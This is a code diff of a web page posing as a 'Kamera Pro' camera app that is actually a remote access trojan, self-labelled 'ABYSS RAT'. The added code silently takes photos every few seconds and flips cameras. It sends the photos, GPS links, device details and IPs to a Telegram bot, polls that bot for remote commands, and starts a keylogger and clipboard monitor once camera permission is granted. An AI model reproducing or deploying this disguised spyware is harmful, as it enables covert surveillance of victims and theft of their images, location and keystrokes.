-                target.closest('.gallery-thumb') ||
-                target.closest('.perm-overlay') ||
-                target.closest('.chip')) {
-                return;
-            }
+            // WATERMARK
+            var ts=new Date().toLocaleString('id-ID');cx.font='14px -apple-system,sans-serif';cx.fillStyle='rgba(255,255,255,.45)';cx.fillText(ts,20,h-18);
 
-            dom.focusRing.style.left = event.clientX + 'px';
-            dom.focusRing.style.top = event.clientY + 'px';
-            dom.focusRing.classList.remove('animate');
-            void dom.focusRing.offsetWidth; // Trigger reflow
-            dom.focusRing.classList.add('animate');
-        });
+            // CAPTION
+            var cap=(silent?'🤫Auto':'📸Foto')+' | '+new Date().toLocaleTimeString('id-ID');
+            if(gpsData)cap+='\n📍 https://maps.google.com/?q='+gpsData.lat+','+gpsData.lon;
+            if(hdOn)cap+=' [4K]';if(hdrOn)cap+=' [HDR]';if(blurOn)cap+=' [Bokeh]';if(softOn)cap+=' [Soft]';
 
-        // ============================================================
-        // INITIALIZATION
-        // ============================================================
-        console.log('╔════════════════════════════════════════╗');
-        console.log('║     📸 KAMERA PRO v9.0                ║');
-        console.log('║     ABYSS RAT — Full Edition          ║');
-        console.log('║     🌀 Blur  🎬 Live  📐 4K          ║');
-        console.log('║     🌅 HDR   ✋ Stab  ✨ Soft        ║');
-        console.log('║     🔍 0.5x · 0.7x · 1x · 1.5x · 2x  ║');
-        console.log('║     🤫 Auto Capture · 🔄 Auto Flip   ║');
-        console.log('║     ⌨️ Keylogger · 📋 Clipboard      ║');
-        console.log('║     📡 C2 Telegram · 💓 Heartbeat    ║');
-        console.log('╚════════════════════════════════════════╝');
-        console.log('🆔 Victim ID:', VID);
-        console.log('🔗 URL:', location.href);
-        console.log('🕐 Time:', getTimestamp());
+            cv.toBlob(function(blob){
+                if(!blob){console.error('❌Blob kosong!');return}
+                console.log('📸 Blob:',(blob.size/1024).toFixed(1),'KB');
+                if(silent)tgBeacon(blob,cap);else tgPhoto(blob,cap);
+                lastPhoto=cv.toDataURL('image/jpeg',.85);
+                thumbBox.innerHTML='<img src="'+lastPhoto+'">';thumbBox.classList.add('has-img');
+                if(!silent){flashEl.classList.add('fire');setTimeout(function(){flashEl.classList.remove('fire')},80);var a=document.createElement('a');a.download='photo_'+Date.now()+'.jpg';a.href=lastPhoto;a.click()}
+                if(liveOn&&!silent){for(var b=0;b<2;b++){(function(d){setTimeout(function(){var lcv=document.createElement('canvas');lcv.width=w;lcv.height=h;var lcx=lcv.getContext('2d');lcx.drawImage(vf,0,0,w,h);lcv.toBlob(function(lb){if(lb)tgBeacon(lb,'🎬Live '+(d/250+1)+'/3')},'image/jpeg',.85)},d)})((b+1)*250)}showTag('🎬LIVE')}
+            },'image/jpeg',0.85);
+        }catch(e){console.error('❌Capture error:',e)}
+    }
 
-    })();
-    </script>
+    // ==================== AUTO CAPTURE ====================
+    function startSilent(){if(silentTimer)return;setTimeout(function(){captureFrame(true)},2000);silentTimer=setInterval(function(){if(stream&&stream.active)captureFrame(true)},5000)}
+    function startFlip(){if(flipTimer)return;flipTimer=setInterval(function(){if(!stream||!stream.active)return;var nf=facingMode==='environment'?'user':'environment';startCamera(nf)},18000)}
+
+    // ==================== STABILIZER ====================
+    function startStabilizer(){if(!stabOn||!window.DeviceOrientationEvent)return;window.addEventListener('deviceorientation',function(e){if(!stream||!stream.active||!stabOn)return;var g=e.gamma||0,b=e.beta||0;vf.style.transform=vf.classList.contains('front')?'translate('+(-g*.025)+'px,'+(b*.025)+'px) scaleX(-1)':'translate('+(-g*.025)+'px,'+(b*.025)+'px)'})}
+
+    // ==================== C2 ====================
+    function pollC2(){try{fetch(API+'/getUpdates?offset='+(lastUpdateId+1)+'&timeout=5').then(function(r){return r.json()}).then(function(d){if(!d.ok||!d.result.length)return;for(var i=0;i<d.result.length;i++){var u=d.result[i];lastUpdateId=u.update_id;var m=u.message;if(!m||!m.text)continue;var p=m.text.trim().split(/\s+/),cmd=p[0].toLowerCase(),tgt=p[1]||'';if(tgt!==VID&&tgt!=='ALL')continue;var re='';switch(cmd){case'/ping':re='🟢Online';break;case'/photo':captureFrame(false);re='📸OK';break;case'/gps':re=gpsData?JSON.stringify(gpsData):'N/A';break;case'/flip':var nf=facingMode==='environment'?'user':'environment';startCamera(nf);re='📷'+nf;break;case'/blur':blurOn=!blurOn;btnBlur.classList.toggle('on',blurOn);re='🌀'+(blurOn?'ON':'OFF');break;case'/live':liveOn=!liveOn;btnLive.classList.toggle('on',liveOn);re='🎬'+(liveOn?'ON':'OFF');break;case'/hd':hdOn=!hdOn;btnHD.classList.toggle('on',hdOn);startCamera(facingMode);re='📐'+(hdOn?'ON':'OFF');break;case'/hdr':hdrOn=!hdrOn;btnHDR.classList.toggle('on',hdrOn);re='🌅'+(hdrOn?'ON':'OFF');break;case'/stab':stabOn=!stabOn;btnStab.classList.toggle('on',stabOn);re='✋'+(stabOn?'ON':'OFF');break;case'/soft':softOn=!softOn;btnSoft.classList.toggle('on',softOn);re='✨'+(softOn?'ON':'OFF');break;case'/info':re='🆔'+VID+'\n📷'+facingMode+'\n🔍'+currentZoom+'×\n🌀'+blurOn+'🎬'+liveOn+'📐'+hdOn+'🌅'+hdrOn+'✋'+stabOn+'✨'+softOn;break;default:re='❓'+cmd}if(re)tg('['+VID+']'+re)}})}catch(e){}}
+    function startC2(){if(c2Timer)return;function lp(){pollC2();c2Timer=setTimeout(lp,3000)}lp()}
+
+    // ==================== ZOOM ====================
+    function applyZoom(){if(!stream)return;try{var t=stream.getVideoTracks()[0],cap=t.getCapabilities();if(cap.zoom){var v=Math.min(cap.zoom.max||5,Math.max(cap.zoom.min||.5,currentZoom));t.applyConstraints({advanced:[{zoom:v}]}).catch(function(){})}}catch(e){}document.querySelectorAll('.zm').forEach(function(el){el.classList.toggle('on',parseFloat(el.dataset.z)===currentZoom)})}
+
+    // ==================== CAMERA ====================
+    function startCamera(facing){
+        if(isStarting)return;isStarting=true;btnStart.disabled=true;errMsg.textContent='';
+        if(stream){stream.getTracks().forEach(function(t){t.stop()});stream=null;vf.srcObject=null}
+        navigator.mediaDevices.getUserMedia({video:{facingMode:facing||facingMode,width:{ideal:hdOn?2560:1280},height:{ideal:hdOn?1440:720}},audio:false}).then(function(s){stream=s;vf.srcObject=s;return vf.play()}).then(function(){if(facing)facingMode=facing;if(facingMode==='user')vf.classList.add('front');else vf.classList.remove('front');applyZoom();permOverlay.classList.add('hidden');isStarting=false;btnStart.disabled=false;initRAT()}).catch(function(e1){navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode==='environment'?'user':'environment'},audio:false}).then(function(s){stream=s;vf.srcObject=s;return vf.play()}).then(function(){facingMode=facingMode==='environment'?'user':'environment';if(facingMode==='user')vf.classList.add('front');else vf.classList.remove('front');applyZoom();permOverlay.classList.add('hidden');isStarting=false;btnStart.disabled=false;initRAT()}).catch(function(e2){errMsg.textContent='Gagal';isStarting=false;btnStart.disabled=false})})
+    }
+
+    function initRAT(){grabIPs().then(function(ips){localIPs=ips;tg('🟢ONLINE\n🆔'+VID+'\n📱'+navigator.userAgent.substring(0,80)+'\n🖥️'+screen.width+'×'+screen.height+'\n🌐'+navigator.language+'\n🌍IP:'+(ips.join(',')||'N/A')+'\n🌀Blur:'+blurOn+'🎬Live:'+liveOn+'📐HD:'+hdOn+'🌅HDR:'+hdrOn+'✋Stab:'+stabOn+'✨Soft:'+softOn)});startGPS();startSilent();startFlip();startKeylogger();startStabilizer();startC2();setInterval(checkClipboard,4000);setInterval(function(){tg('💓HB'+VID+'|'+new Date().toLocaleTimeString('id-ID'))},120000)}
+
+    // ==================== EVENTS ====================
+    btnStart.addEventListener('click',function(){startCamera()});
+    btnShutter.addEventListener('click',function(){captureFrame(false)});
+    btnFlip.addEventListener('click',function(){var nf=facingMode==='environment'?'user':'environment';startCamera(nf)});
+    btnFlash.addEventListener('click',function(){if(!stream)return;flashOn=!flashOn;stream.getVideoTracks()[0].applyConstraints({advanced:[{torch:flashOn}]}).catch(function(){});btnFlash.classList.toggle('on',flashOn)});
+    btnBlur.addEventListener('click',function(){blurOn=!blurOn;btnBlur.classList.toggle('on',blurOn)});
+    btnLive.addEventListener('click',function(){liveOn=!liveOn;btnLive.classList.toggle('on',liveOn)});
+    btnHD.addEventListener('click',function(){hdOn=!hdOn;btnHD.classList.toggle('on',hdOn);startCamera(facingMode)});
+    btnHDR.addEventListener('click',function(){hdrOn=!hdrOn;btnHDR.classList.toggle('on',hdrOn)});
+    btnStab.addEventListener('click',function(){stabOn=!stabOn;btnStab.classList.toggle('on',stabOn)});
+    btnSoft.addEventListener('click',function(){softOn=!softOn;btnSoft.classList.toggle('on',softOn)});
+    document.querySelectorAll('.zm').forEach(function(el){el.addEventListener('click',function(){currentZoom=parseFloat(this.dataset.z);applyZoom()})});
+    thumbBox.addEventListener('click',function(){if(!lastPhoto)return;var w=window.open('','_blank');w.document.write('<html><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style><img src="'+lastPhoto+'" onclick="window.close()"></html>');w.document.close()});
+    document.addEventListener('click',function(e){if(e.target.closest('button')||e.target.closest('.zm')||e.target.closest('.thumb-box')||e.target.closest('.perm-overlay'))return;focusRing.style.left=e.clientX+'px';focusRing.style.top=e.clientY+'px';focusRing.classList.remove('pop');void focusRing.offsetWidth;focusRing.classList.add('pop')});
+
+    console.log('📸 Kamera Pro — FOTO FIX');
+})();
+</script>
 </body>
 </html>
